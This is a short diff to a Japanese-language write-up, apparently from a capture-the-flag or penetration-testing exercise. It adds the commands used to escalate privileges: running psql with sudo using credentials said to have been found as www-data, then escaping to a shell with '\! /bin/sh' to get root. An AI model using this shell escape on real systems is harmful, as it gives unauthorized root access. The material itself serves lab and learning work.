@@ -46,7 +46,11 @@ psql
 ```
 ```sh
 # 実際に実行したコマンド
-
+sudo psql -h 127.0.0.1 -U postgres
+password for user postgres: # ← www-dataで発見した認証情報
+\! /bin/sh
+# whoami
+root
 ```
 
 
